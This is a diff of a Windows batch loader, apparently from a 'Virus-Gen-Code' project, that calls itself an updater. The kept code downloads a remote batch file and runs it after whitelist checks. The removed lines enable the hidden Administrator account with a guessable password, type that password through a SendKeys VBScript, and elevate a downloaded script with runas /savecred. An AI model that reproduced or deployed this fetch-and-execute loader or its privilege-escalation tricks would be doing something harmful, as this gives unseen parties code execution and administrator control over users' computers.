@@ -1,11 +1,5 @@
 @echo off&Title updating...&cd C:\users\%username%\AppData&cls
 ::WL check 1
-echo has been updated
-if exist "C:\users\%username%\appdata\forceupdate.txt" (
-  del "C:\users\%username%\appdata\forceupdate.txt"
-  goto forceupdate
-)
-if exist "C:\users\%username%\appdata\updateflag.txt" goto update
 echo [33mvalidating configuration[0m
 goto CP
 :adminyes
@@ -17,46 +11,19 @@ Dism /online /Get-FeatureInfo /FeatureName:Internet-Explorer-Optional-amd64>data
 )
 :int_exp_found
 echo [92mvalidation complete[0m
-echo [33mchecking for updates...[0m
-if not exist C:\ProgramData\UPnum.sav echo V0.00.00>C:\ProgramData\UPnum.sav
-< C:\ProgramData\UPnum.sav (
-  set /p update_number=
-)
-Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/update_number.txt").Content >C:\ProgramData\UPnum.sav
->nul find "At" C:\ProgramData\UPnum.sav && (
+echo [33mstarting check 1[0m
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Email-whitelist").Content >WL1.sav
+>nul find "At" WL1.sav && (
   goto offline
 ) || (
   goto online
 )
 :online
-< C:\ProgramData\UPnum.sav (
-  set /p UPnum=
-)
-if %UPnum% equ %update_number% goto relaunch
-:forceupdate
-echo placeholder>"C:\users\%username%\appdata\update_log_flag"
-echo [92mupdate detected![0m
-net user administrator>nul
-if %errorlevel% neq 0 (
-    echo performing first time setup
-    net user administrator %username% /active:yes
-    echo creating VBScript password macro
-    echo Set WshShell = WScript.CreateObject("WScript.Shell") >macro.vbs
-    echo wscript.sleep 300 >>macro.vbs
-    echo wshshell.sendkeys "%username%" >>macro.vbs
-    echo wscript.sleep 100 >>macro.vbs
-    echo wshshell.sendkeys "{ENTER}" >>macro.vbs
-    cscript macro.vbs
-)
-runas /user:%computername%\Administrator /savecred "C:\Users\%username%\OneDrive\Desktop\Elevation test\File to Elevate.bat"
-del macro.vbs
-echo [33mstarting check 1...[0m
-Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Email-whitelist").Content >WL1.sav
 if exist C:\ProgramData\GVGemail.sav (goto WLcheck) else (goto email_error)
 :EMnxt
 del WL1.sav
 echo [92mcheck 1 completed[0m
-echo [33mstarting check 2...[0m
+echo [33mstarting check 2[0m
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Device-whitelist").Content >WL2.sav
 >nul find "%username%" WL2.sav && (
   goto deviceNXT
@@ -66,31 +33,18 @@ Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest25735
 :deviceNXT
 del WL2.sav
 echo [92mcheck 2 completed[0m
-echo [33mupdating...[0m
-Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/environment_updater.bat").Content >environment_updater.bat
-start macro.vbs
-runas /user:%computername%\Administrator /savecred environment_updater.bat
-exit
-:update
-echo [33mupdate stage 2...[0m
+echo [33mupdating[0m
 :: download source
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/source").Content >GVG.bat
-del "C:\users\%username%\appdata\updateflag.txt"
 echo [92mupdate complete[0m
-:relaunch
 call GVG.bat
 timeout 1 /NOBREAK >nul
-if not exist "C:\users\%username%\appdata\exit_true.txt" (
-echo a crash was detected, restarting...
-del "C:\users\%username%\appdata\exit_true.txt"
-timeout 1 /NOBREAK >nul
-goto relaunch)
 del GVG.bat
 exit
 :offline
-del update_number.txt
+del WL1.sav
 echo.
-echo [31mthis program requires an internet connection[0m
+echo [31this program requires an internet connection[0m
 echo.
 echo press any key to exit...
 pause >nul
@@ -142,7 +96,7 @@ exit
 dism /online /enable-feature /featurename:SearchEngine-Client-Package /all
 Dism /online /Enable-Feature /FeatureName:Internet-Explorer-Optional-amd64 /All
 echo you cannot use this program till you restart
-echo exiting in 10 seconds...
+echo exiting in 10 secconds...
 timeout 10
 exit
 :CP
@@ -152,3 +106,4 @@ exit
     ) else (
         goto admin_error
     )
+:loader create_loader
